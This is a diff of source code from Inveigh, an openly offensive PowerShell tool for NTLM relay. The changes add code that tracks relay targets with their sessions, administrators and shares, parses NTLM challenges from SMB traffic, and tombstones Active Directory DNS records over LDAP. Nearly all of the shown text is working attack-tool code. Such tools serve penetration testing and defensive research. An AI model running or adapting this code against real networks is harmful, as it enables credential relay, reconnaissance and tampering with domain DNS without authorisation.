@@ -227,7 +227,7 @@ param
     [parameter(Mandatory=$false)][Int]$ProxyPort = "8492",
     [parameter(Mandatory=$false)][Int]$RunTime = "",
     [parameter(Mandatory=$false)][Int]$SessionLimitPriv = "2",
-    [parameter(Mandatory=$false)][Int]$SessionLimitShare = "10",
+    [parameter(Mandatory=$false)][Int]$SessionLimitShare = "2",
     [parameter(Mandatory=$false)][Int]$SessionLimitUnpriv = "0",
     [parameter(Mandatory=$false)][Int]$SessionRefresh = "10",
     [parameter(Mandatory=$false)][Int]$TargetRefresh = "60",
@@ -279,9 +279,9 @@ if($inveigh.relay_running)
     throw
 }
 
-$inveigh_version = "1.4 Dev"
+$inveigh_version = "1.4"
 
-if(!$target -and !$inveigh.enumerated_data)
+if(!$target -and !$inveigh.enumerate)
 {
     Write-Output "[-] No enumerated target data, specify targets with -Target"
     throw
@@ -321,6 +321,7 @@ if(!$inveigh)
 {
     $global:inveigh = [HashTable]::Synchronized(@{})
     $inveigh.cleartext_list = New-Object System.Collections.ArrayList
+    $inveigh.enumerate = New-Object System.Collections.ArrayList
     $inveigh.IP_capture_list = New-Object System.Collections.ArrayList
     $inveigh.log = New-Object System.Collections.ArrayList
     $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList
@@ -341,8 +342,7 @@ if(!$inveigh)
     $inveigh.domain_mapping_table = [HashTable]::Synchronized(@{})
     $inveigh.group_table = [HashTable]::Synchronized(@{})
     $inveigh.session_count = 0
-    $inveigh.session_list = @()
-    $inveigh.enumerated_data = @()
+    $inveigh.session = @()
 }
 
 $inveigh.stop = $false
@@ -369,9 +369,6 @@ if(!$inveigh.running)
     $inveigh.NTLMv2_out_file = $output_directory + "\Inveigh-NTLMv2.txt"
     $inveigh.POST_request_out_file = $output_directory + "\Inveigh-FormInput.txt"
 }
-
-$inveigh.target_list = New-Object System.Collections.ArrayList
-$inveigh.target_exclude_list = New-Object System.Collections.ArrayList
 
 if($StartupChecks -eq 'Y')
 {
@@ -815,7 +812,7 @@ if($Target)
     }
 
     $inveigh.output_queue.Add("[*] Parsing Relay Target List") > $null
-    $inveigh.target_list = Get-TargetList $Target
+    [Array]$inveigh.target_list = Get-TargetList $Target
 }
 
 if($TargetExclude)
@@ -835,13 +832,7 @@ if($TargetExclude)
     }
 
     $inveigh.output_queue.Add("[*] Parsing Relay Target Exclude List") > $null
-    $inveigh.target_exclude_list = Get-TargetList $TargetExclude
-
-    if($inveigh.target_list -and $inveigh.target_exclude_list)
-    {
-        $inveigh.target_list = Compare-Object -ReferenceObject $inveigh.target_exclude_list -DifferenceObject $inveigh.target_list -PassThru
-    }
-
+    [Array]$inveigh.target_exclude_list = Get-TargetList $TargetExclude
 }
 
 if($Username)
@@ -1043,7 +1034,7 @@ $inveigh.computer_name = (Get-ChildItem -path env:computername).Value
 
 try
 {
-    $inveigh.DNS_domain = ((Get-ChildItem -path env:userdnsdomain).Value).ToLower()
+    $inveigh.DNS_domain = ((Get-ChildItem -path env:userdnsdomain -ErrorAction 'SilentlyContinue').Value).ToLower()
     $inveigh.DNS_computer_name = ($inveigh.computer_name + "." + $inveigh.DNS_domain).ToLower()
 
     if(!$inveigh.domain_mapping_table.ContainsKey($inveigh.netBIOS_domain))
@@ -1056,6 +1047,161 @@ catch
 {
     $inveigh.DNS_domain = $inveigh.netBIOS_domain
     $inveigh.DNS_computer_name = $inveigh.computer_name
+}
+
+if($inveigh.enumerate)
+{
+    $inveigh.output_queue.Add("[*] Performing DNS lookups for imported targets") > $null
+
+    for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
+    {
+
+        if($inveigh.enumerate[$i].Hostname -and !$inveigh.enumerate[$i].IP -and $inveigh.enumerate[$i]."DNS Record" -ne $false)
+        {
+
+            try
+            {
+                $IP_list = [System.Net.Dns]::GetHostEntry($inveigh.enumerate[$i].Hostname)
+
+                foreach($entry in $IP_list.AddressList)
+                {
+
+                    if($entry.AddressFamily -eq 'InterNetwork')
+                    {
+                        $inveigh.enumerate[$i].IP = $entry.IPAddressToString
+                        $inveigh.enumerate[$i]."DNS Record" = $true
+                        $inveigh.enumerate[$i]."IPv6 Only" = $false
+                        $target_enumerate_keep = $true
+                    }
+
+                }
+
+                if(!$target_enumerate_keep)
+                {
+                    $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] IPv6 target $($inveigh.enumerate[$i].Hostname) not supported") > $null
+                    $inveigh.enumerate[$i]."IPv6 Only" = $true
+                }
+
+            }
+            catch
+            {
+                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] DNS lookup for $($inveigh.enumerate[$i].Hostname) failed") > $null
+                $inveigh.enumerate[$i]."DNS Record" = $false
+            }
+
+            $target_enumerate_keep = $false
+            $IP_list = $null
+        }
+
+    }
+
+}
+
+if($inveigh.target_list)
+{
+    $inveigh.output_queue.Add("[*] Performing DNS lookups on any hostname targets") > $null
+
+    for($i = 0;$i -lt $inveigh.target_list.Count;$i++)
+    {
+
+        if(!($inveigh.target_list[$i] -as [IPAddress] -as [Bool]))
+        {
+
+            try
+            {
+                $IP_list = [System.Net.Dns]::GetHostEntry($inveigh.target_list[$i])
+
+                foreach($entry in $IP_list.AddressList)
+                {
+
+                    if($entry.AddressFamily -eq 'InterNetwork')
+                    {
+                        $inveigh.target_list[$i] = $entry.IPAddressToString
+                        $target_keep = $true
+                    }
+
+                    if(!$target_keep)
+                    {
+                        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] IPv6 target $($inveigh.target_list[$i]) not supported") > $null
+                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Removed $($inveigh.target_list[$i]) from target list") > $null
+                        $inveigh.target_list[$i] = $null
+                    }
+
+                }
+                        
+            }
+            catch
+            {
+                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] DNS lookup for $($inveigh.target_list[$i]) failed") > $null
+                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Removed $($inveigh.target_list[$i]) from target list") > $null
+                $inveigh.target_list[$i] = $null
+            }
+
+            $target_keep = $false
+            $IP_list = $null
+        }
+
+    }
+
+    if(!$inveigh.target_list -and !$inveigh.enumerated)
+    {
+        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] No remaining targets") > $null
+        throw
+    }
+
+}
+
+if($inveigh.target_exclude_list)
+{
+    $inveigh.output_queue.Add("[*] Performing DNS lookups on excluded hostname targets") > $null
+
+    for($i = 0;$i -lt $inveigh.target_exclude_list.Count;$i++)
+    {
+
+        if(!($inveigh.target_exclude_list[$i] -as [IPAddress] -as [Bool]))
+        {
+
+            try
+            {
+                $IP_list = [System.Net.Dns]::GetHostEntry($inveigh.target_exclude_list[$i])
+
+                foreach($entry in $IP_list.AddressList)
+                {
+
+                    if($entry.AddressFamily -eq 'InterNetwork')
+                    {
+                        $inveigh.target_exclude_list[$i] = $entry.IPAddressToString
+                        $target_exclude_keep = $true
+                    }
+
+                }
+
+                if(!$target_exclude_keep)
+                {
+                    $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] IPv6 target $($inveigh.target_list[$i]) not supported") > $null
+                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Removed $($inveigh.target_exclude_list[$i]) from exclusion list") > $null
+                    $inveigh.target_exclude_list[$i] = $null
+                }
+
+            }
+            catch
+            {
+                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] DNS lookup for $($inveigh.target_exclude_list[$i]) failed") > $null
+                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Removed $($inveigh.target_exclude_list[$i]) from exclusion list") > $null
+                $inveigh.target_exclude_list[$i] = $null
+            }
+
+            $target_exclude_keep = $false
+            $IP_list = $null
+        }
+
+    }
+
+}
+
+if($inveigh.target_list -and $inveigh.target_exclude_list)
+{
+    $inveigh.target_list = Compare-Object -ReferenceObject $inveigh.target_exclude_list -DifferenceObject $inveigh.target_list -PassThru
 }
 
 #endregion
@@ -1093,6 +1239,316 @@ $shared_basic_functions_scriptblock =
         $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
 
         return $string_extract
+    }
+
+    function New-RelayEnumObject
+    {
+        param ($IP,$Hostname,$DNSDomain,$netBIOSDomain,$Sessions,$AdministratorUsers,$AdministratorGroups,
+            $Privileged,$Shares,$NetSessions,$NetSessionsMapped,$LocalUsers,$SMB2,$Signing,$SMBServer,$DNSRecord,
+            $IPv6Only,$Targeted,$Enumerate,$Execute)
+
+        if($Sessions -and $Sessions -isnot [Array]){$Sessions = @($Sessions)}
+        if($AdministratorUsers -and $AdministratorUsers -isnot [Array]){$AdministratorUsers = @($AdministratorUsers)}
+        if($AdministratorGroups -and $AdministratorGroups -isnot [Array]){$AdministratorGroups = @($AdministratorGroups)}
+        if($Privileged -and $Privileged -isnot [Array]){$Privileged = @($Privileged)}
+        if($Shares -and $Shares -isnot [Array]){$Shares = @($Shares)}
+        if($NetSessions -and $NetSessions -isnot [Array]){$NetSessions = @($NetSessions)}
+        if($NetSessionsMapped -and $NetSessionsMapped -isnot [Array]){$NetSessionsMapped = @($NetSessionsMapped)}
+        if($LocalUsers -and $LocalUsers -isnot [Array]){$LocalUsers = @($LocalUsers)}
+
+        $relay_object = New-Object PSObject
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Index" $inveigh.enumerate.Count
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "IP" $IP
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Hostname" $Hostname
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "DNS Domain" $DNSDomain
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "netBIOS Domain" $netBIOSDomain
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Sessions" $Sessions
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Administrator Users" $AdministratorUsers
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Administrator Groups" $AdministratorGroups
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Privileged" $Privileged
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Shares" $Shares
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "NetSessions" $NetSessions
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "NetSessions Mapped" $NetSessionsMapped
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Local Users" $LocalUsers
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "SMB2.1" $SMB2
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Signing" $Signing
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "SMB Server" $SMBServer
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "DNS Record" $DNSRecord
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "IPv6 Only" $IPv6Only
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Targeted" $Targeted
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Enumerate" $Enumerate
+        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Execute" $Execute
+        
+        return $relay_object
+    }
+
+    function Invoke-SessionUpdate
+    {
+        param ([String]$domain,[String]$username,[String]$hostname,[String]$IP)
+
+        if($inveigh.domain_mapping_table.$domain)
+        {
+            $session = ($username + "@" + $inveigh.domain_mapping_table.$domain).ToUpper()
+            $hostname_full = ($hostname + "." + $inveigh.domain_mapping_table.$domain).ToUpper()
+        }
+        else
+        {
+            $session = $domain + "\" + $username
+        }
+
+        for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
+        {
+
+            if($inveigh.enumerate[$i].Hostname -eq $hostname_full -or $inveigh.enumerate[$i].IP -eq $IP)
+            {
+
+                if(!$inveigh.enumerate[$i].Hostname)
+                {
+                    $inveigh.enumerate[$target_index].Hostname = $hostname_full
+                }
+
+                [Array]$session_list = $inveigh.enumerate[$i].Sessions
+
+                if($inveigh.domain_mapping_table.$domain)
+                {
+
+                    for($j = 0;$j -lt $session_list.Count;$j++)
+                    {
+
+                        if($session_list[$j] -like "$domain\*")
+                        {
+                            $session_username = ($session_list[$j].Split("\"))[1]
+                            $session_update = $session_username + "@" + $inveigh.domain_mapping_table.$domain
+                            $session_list[$j] += $session_update
+                            $inveigh.enumerate[$i].Sessions = $session_list
+                        }
+
+                    }
+
+                }
+
+                if($session_list -notcontains $session)
+                {
+                    $session_list += $session
+                    $inveigh.enumerate[$i].Sessions = $session_list
+                }
+
+                $target_updated = $true
+                break
+            }
+
+        }
+     
+        if(!$target_updated)
+        {
+            $inveigh.enumerate.Add((New-RelayEnumObject -IP $IP -Hostname $hostname_full -Sessions $session)) > $null
+        }
+
+    }
+
+}
+
+# ADIDNS Functions ScriptBlock
+$ADIDNS_functions_scriptblock =
+{
+
+    function Disable-ADIDNSNode
+    {
+
+        [CmdletBinding()]
+        param
+        (
+            [parameter(Mandatory=$false)][String]$Domain,
+            [parameter(Mandatory=$false)][String]$DomainController,
+            [parameter(Mandatory=$true)][String]$Node,
+            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$Partition = "DomainDNSZones",
+            [parameter(Mandatory=$false)][String]$Zone,
+            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
+        )
+
+        $SOASerialNumberArray = New-SOASerialNumberArray -DomainController $DomainController -Zone $Zone
+
+        $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition"
+        $DC_array = $Domain.Split(".")
+
+        foreach($DC in $DC_array)
+        {
+            $distinguished_name += ",DC=$DC"
+        }
+
+        if($Credential)
+        {
+            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/$distinguished_name",$Credential.UserName,$Credential.GetNetworkCredential().Password)
+        }
+        else
+        {
+            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController/$distinguished_name"
+        }
+
+        $timestamp = [Int64](([datetime]::UtcNow.Ticks)-(Get-Date "1/1/1601").Ticks)
+        $timestamp = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($timestamp))
+        $timestamp = $timestamp.Split("-") | ForEach-Object{[System.Convert]::ToInt16($_,16)}
+
+        [Byte[]]$DNS_record = 0x08,0x00,0x00,0x00,0x05,0x00,0x00,0x00 +
+            $SOASerialNumberArray[0..3] +
+            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
+            $timestamp
+
+        try
+        {
+            $directory_entry.InvokeSet('dnsRecord',$DNS_record)
+            $directory_entry.InvokeSet('dnsTombstoned',$true)
+            $directory_entry.SetInfo()
+            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] ADIDNS node $Node tombstoned in $Zone") > $null
+        }
+        catch
+        {
+            $error_message = $_.Exception.Message
+            $error_message = $error_message -replace "`n",""
+            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+        }
+
+        if($directory_entry.Path)
+        {
+            $directory_entry.Close()
+        }
+
+    }
+
+    function New-SOASerialNumberArray
+    {
+
+        [CmdletBinding()]
+        param
+        (
+            [parameter(Mandatory=$false)][String]$DomainController,
+            [parameter(Mandatory=$false)][String]$Zone
+        )
+
+        $Zone = $Zone.ToLower()
+
+        function Convert-DataToUInt16($Field)
+        {
+            [Array]::Reverse($Field)
+            return [System.BitConverter]::ToUInt16($Field,0)
+        }
+
+        function ConvertFrom-PacketOrderedDictionary($OrderedDictionary)
+        {
+
+            foreach($field in $OrderedDictionary.Values)
+            {
+                $byte_array += $field
+            }
+
+            return $byte_array
+        }
+
+        function New-RandomByteArray
+        {
+            param([Int]$Length,[Int]$Minimum=1,[Int]$Maximum=255)
+
+            [String]$random = [String](1..$Length | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum $Minimum -Maximum $Maximum)})
+            [Byte[]]$random = $random.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+
+            return $random
+        }
+
+        function New-DNSNameArray
+        {
+            param([String]$Name)
+
+            $character_array = $Name.ToCharArray()
+            [Array]$index_array = 0..($character_array.Count - 1) | Where-Object {$character_array[$_] -eq '.'}
+
+            if($index_array.Count -gt 0)
+            {
+
+                $name_start = 0
+
+                foreach($index in $index_array)
+                {
+                    $name_end = $index - $name_start
+                    [Byte[]]$name_array += $name_end
+                    [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start,$name_end))
+                    $name_start = $index + 1
+                }
+
+                [Byte[]]$name_array += ($Name.Length - $name_start)
+                [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start))
+            }
+            else
+            {
+                [Byte[]]$name_array = $Name.Length
+                [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start))
+            }
+
+            return $name_array
+        }
+
+        function New-PacketDNSSOAQuery
+        {
+            param([String]$Name)
+
+            [Byte[]]$type = 0x00,0x06
+            [Byte[]]$name = (New-DNSNameArray $Name) + 0x00
+            [Byte[]]$length = [System.BitConverter]::GetBytes($Name.Count + 16)[1,0]
+            [Byte[]]$transaction_ID = New-RandomByteArray 2
+            $DNSQuery = New-Object System.Collections.Specialized.OrderedDictionary
+            $DNSQuery.Add("Length",$length)
+            $DNSQuery.Add("TransactionID",$transaction_ID)
+            $DNSQuery.Add("Flags",[Byte[]](0x01,0x00))
+            $DNSQuery.Add("Questions",[Byte[]](0x00,0x01))
+            $DNSQuery.Add("AnswerRRs",[Byte[]](0x00,0x00))
+            $DNSQuery.Add("AuthorityRRs",[Byte[]](0x00,0x00))
+            $DNSQuery.Add("AdditionalRRs",[Byte[]](0x00,0x00))
+            $DNSQuery.Add("Queries_Name",$name)
+            $DNSQuery.Add("Queries_Type",$type)
+            $DNSQuery.Add("Queries_Class",[Byte[]](0x00,0x01))
+
+            return $DNSQuery
+        }
+
+        $DNS_client = New-Object System.Net.Sockets.TCPClient
+        $DNS_client.Client.ReceiveTimeout = 3000
+
+        try
+        {
+            $DNS_client.Connect($DomainController,"53")
+            $DNS_client_stream = $DNS_client.GetStream()
+            $DNS_client_receive = New-Object System.Byte[] 2048
+            $packet_DNSQuery = New-PacketDNSSOAQuery $Zone
+            [Byte[]]$DNS_client_send = ConvertFrom-PacketOrderedDictionary $packet_DNSQuery
+            $DNS_client_stream.Write($DNS_client_send,0,$DNS_client_send.Length) > $null
+            $DNS_client_stream.Flush()   
+            $DNS_client_stream.Read($DNS_client_receive,0,$DNS_client_receive.Length) > $null
+            $DNS_client.Close()
+            $DNS_client_stream.Close()
+
+            if($DNS_client_receive[9] -eq 0)
+            {
+                $inveigh.output_queue.Add("[-] $Zone SOA record not found") > $null
+            }
+            else
+            {
+                $DNS_reply_converted = [System.BitConverter]::ToString($DNS_client_receive)
+                $DNS_reply_converted = $DNS_reply_converted -replace "-",""
+                $SOA_answer_index = $DNS_reply_converted.IndexOf("C00C00060001")
+                $SOA_answer_index = $SOA_answer_index / 2
+                $SOA_length = $DNS_client_receive[($SOA_answer_index + 10)..($SOA_answer_index + 11)]
+                $SOA_length = Convert-DataToUInt16 $SOA_length
+                [Byte[]]$SOA_serial_current_array = $DNS_client_receive[($SOA_answer_index + $SOA_length - 8)..($SOA_answer_index + $SOA_length - 5)]
+                $SOA_serial_current = [System.BitConverter]::ToUInt32($SOA_serial_current_array[3..0],0) + 1
+                [Byte[]]$SOA_serial_number_array = [System.BitConverter]::GetBytes($SOA_serial_current)[0..3]
+            }
+
+        }
+        catch
+        {
+            $inveigh.output_queue.Add("[-] $DomainController did not respond on TCP port 53") > $null
+        }
+
+        return [Byte[]]$SOA_serial_number_array
     }
 
 }
@@ -1640,9 +2096,6 @@ $packet_functions_scriptblock =
     {
         param ([Byte[]]$packet_service,[Byte[]]$packet_service_length)
     
-        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service.Length + 92)
-        [Byte[]]$packet_frag_length = $packet_write_length[0,1]
-        [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service.Length + 68)
         $packet_referent_ID1 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
         $packet_referent_ID1 = $packet_referent_ID1.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
         $packet_referent_ID1 += 0x00,0x00
@@ -2063,21 +2516,21 @@ function New-PacketSRVSVCNetShareEnumAll
 $SMB_relay_functions_scriptblock =
 {
 
-    function Invoke-SMBNTLMChallenge
+    function Get-SMBNTLMChallenge
     {
-        param ([Byte[]]$payload_bytes)
+        param ([Byte[]]$Payload)
 
-        $payload = [System.BitConverter]::ToString($payload_bytes)
-        $payload = $payload -replace "-",""
-        $NTLM_index = $payload.IndexOf("4E544C4D53535000")
+        $payload_converted = [System.BitConverter]::ToString($Payload)
+        $payload_converted = $payload_converted -replace "-",""
+        $NTLM_index = $payload_converted.IndexOf("4E544C4D53535000")
 
-        if($payload.SubString(($NTLM_index + 16),8) -eq "02000000")
+        if($payload_converted.SubString(($NTLM_index + 16),8) -eq "02000000")
         {
-            $NTLM_challenge = $payload.SubString(($NTLM_index + 48),16)
+            $NTLM_challenge = $payload_converted.SubString(($NTLM_index + 48),16)
         }
 
-        $target_name_length = Get-UInt16DataLength (($NTLM_index + 24) / 2) $payload_bytes
-        $negotiate_flags = [System.Convert]::ToInt16(($payload.SubString(($NTLM_index + 44),2)),16)
+        $target_name_length = Get-UInt16DataLength (($NTLM_index + 24) / 2) $Payload
+        $negotiate_flags = [System.Convert]::ToInt16(($payload_converted.SubString(($NTLM_index + 44),2)),16)
         $negotiate_flags = [Convert]::ToString($negotiate_flags,2)
         $target_info_flag = $negotiate_flags.SubString(0,1)
 
@@ -2085,110 +2538,60 @@ $SMB_relay_functions_scriptblock =
         {
             $target_info_index = ($NTLM_index + 80) / 2
             $target_info_index = $target_info_index + $target_name_length + 16
-            $target_info_item_type = $payload_bytes[$target_info_index]
+            $target_info_item_type = $Payload[$target_info_index]
             $i = 0
 
             while($target_info_item_type -ne 0 -and $i -lt 10)
             {
-                $target_info_item_length = Get-UInt16DataLength ($target_info_index + 2) $payload_bytes
+                $target_info_item_length = Get-UInt16DataLength ($target_info_index + 2) $Payload
 
                 switch($target_info_item_type) 
                 {
 
                     2
                     {
-                        $netBIOS_domain_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $payload_bytes
+                        $netBIOS_domain_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload
                     }
 
                     3
                     {
-                        $DNS_computer_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $payload_bytes
+                        $DNS_computer_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload
                     }
 
                     4
                     {
-                        $DNS_domain_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $payload_bytes
+                        $DNS_domain_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload
                     }
 
                 }
-                
+
                 $target_info_index = $target_info_index + $target_info_item_length + 4
-                $target_info_item_type = $payload_bytes[$target_info_index]
+                $target_info_item_type = $Payload[$target_info_index]
                 $i++
             }
 
-            if($netBIOS_domain_name -and $DNS_domain_name -and !$inveigh.domain_mapping_table.ContainsKey($netBIOS_domain_name) -and $netBIOS_domain_name -ne $DNS_domain_name)
+            if($netBIOS_domain_name -and $DNS_domain_name -and !$inveigh.domain_mapping_table.$netBIOS_domain_name -and $netBIOS_domain_name -ne $DNS_domain_name)
             {
                 $inveigh.domain_mapping_table.Add($netBIOS_domain_name,$DNS_domain_name)
                 $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] Domain mapping added for $netBIOS_domain_name to $DNS_domain_name") > $null
             }
 
-            $target_index = $inveigh.enumerated_data | Where-Object {$_.IP -eq $target} | Select-Object -expand Index -First 1
-
-            if($inveigh.enumerated_data | Where-Object {$_.IP -eq $target -and !$_.Hostname})
-            {
-                $inveigh.enumerated_data[$target_index].Hostname = $DNS_computer_name
-                $inveigh.enumerated_data[$target_index]."DNS Domain" = $DNS_domain_name
-                $inveigh.enumerated_data[$target_index]."netBIOS Domain" = $netBIOS_domain_name
-            }
-            elseif($inveigh.enumerated_data[$target_index].Hostname -ne $DNS_computer_name)
+            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
             {
 
-                if($inveigh.enumerated_data | Where-Object {$_.Hostname -eq $DNS_computer_name})
+                if($inveigh.enumerate[$i].IP -eq $target -and !$inveigh.enumerate[$i].Hostname)
                 {
-                    $target_hostname_index = $inveigh.enumerated_data | Where-Object {$_.Hostname -eq $DNS_computer_name} | Select-Object -expand Index
-                    $inveigh.enumerated_data[$target_hostname_index].IP = $target
-                    $inveigh.enumerated_data[$target_index].IP = $null
+                    $inveigh.enumerate[$i].Hostname = $DNS_computer_name
+                    $inveigh.enumerate[$i]."DNS Domain" = $DNS_domain_name
+                    $inveigh.enumerate[$i]."netBIOS Domain" = $netBIOS_domain_name
+                    break
                 }
-                else
-                {
-                    $inveigh.enumerated_data += New-RelayEnumObject -IP $target -Hostname $DNS_computer_name -DNSDomain $DNSDomain -netBIOSDomain $netBIOSDomain -SMBServer $true -Targeted $(Get-Date -format s)
-                }
-                
+
             }
 
         }
 
         return $NTLM_challenge
-    }
-
-    function New-RelayEnumObject
-    {
-        param ($IP,$Hostname,$DNSDomain,$netBIOSDomain,$Sessions,$AdministratorUsers,$AdministratorGroups,
-            $Privileged,$Shares,$NetSessions,$NetSessionsMapped,$LocalUsers,$SMB2,$Signing,$SMBServer,$Targeted,
-            $Enumerate,$Execute)
-
-        if($Sessions -and $Sessions -isnot [Array]){$Sessions = @($Sessions)}
-        if($AdministratorUsers -and $AdministratorUsers -isnot [Array]){$AdministratorUsers = @($AdministratorUsers)}
-        if($AdministratorGroups -and $AdministratorGroups -isnot [Array]){$AdministratorGroups = @($AdministratorGroups)}
-        if($Privileged -and $Privileged -isnot [Array]){$Privileged = @($Privileged)}
-        if($Shares -and $Shares -isnot [Array]){$Shares = @($Shares)}
-        if($NetSessions -and $NetSessions -isnot [Array]){$NetSessions = @($NetSessions)}
-        if($NetSessionsMapped -and $NetSessionsMapped -isnot [Array]){$NetSessionsMapped = @($NetSessionsMapped)}
-        if($LocalUsers -and $LocalUsers -isnot [Array]){$LocalUsers = @($LocalUsers)}
-
-        $relay_object = New-Object PSObject
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Index" $inveigh.enumerated_data.Count
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "IP" $IP
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Hostname" $Hostname
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "DNS Domain" $DNSDomain
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "netBIOS Domain" $netBIOSDomain
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Sessions" $Sessions
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Administrator Users" $AdministratorUsers
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Administrator Groups" $AdministratorGroups
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Privileged" $Privileged
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Shares" $Shares
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "NetSessions" $NetSessions
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "NetSessions Mapped" $NetSessionsMapped
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Local Users" $LocalUsers
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "SMB2.1" $SMB2
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Signing" $Signing
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "SMB Server" $SMBServer
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Targeted" $Targeted
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Enumerate" $Enumerate
-        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Execute" $Execute
-        
-        return $relay_object
     }
 
     function Invoke-SMBConnect
@@ -2213,15 +2616,25 @@ $SMB_relay_functions_scriptblock =
                 $SMB_server = $false    
             }
 
-            if($inveigh.enumerated_data | Where-Object {$_.IP -eq $target})
+            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
             {
-                $target_index = $inveigh.enumerated_data | Where-Object {$_.IP -eq $target} | Select-Object -expand Index -First 1
-                $inveigh.enumerated_data[$target_index]."SMB Server" = $SMB_server
-                $inveigh.enumerated_data[$target_index]."Targeted" = $(Get-Date -format s)
+
+                if($inveigh.enumerate[$i].IP -eq $target)
+                {
+                    $target_index = $i
+                    break
+                }
+
+            }
+
+            if($target_index -and $inveigh.enumerate[$target_index].IP -eq $target)
+            {
+                $inveigh.enumerate[$target_index]."SMB Server" = $SMB_server
+                $inveigh.enumerate[$target_index]."Targeted" = $(Get-Date -format s)
             }
             else
             {
-                $inveigh.enumerated_data += New-RelayEnumObject -IP $target -SMBServer $SMB_server -Targeted $(Get-Date -format s)
+                $inveigh.enumerate.Add((New-RelayEnumObject -IP $target -SMBServer $SMB_server -Targeted $(Get-Date -format s))) > $null
             }
 
             return $SMB_port_test_success
@@ -2243,112 +2656,153 @@ $SMB_relay_functions_scriptblock =
             }
             catch
             {
+                $error_message = $_.Exception.Message
+                $error_message = $error_message -replace "`n",""
+                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) stage $stage") > $null
                 $stage = 'Exit'
             }
 
             while($stage -ne 'Exit')
             {
-            
-                switch ($stage)
+
+                try
                 {
-
-                    'NegotiateSMB'
-                    {
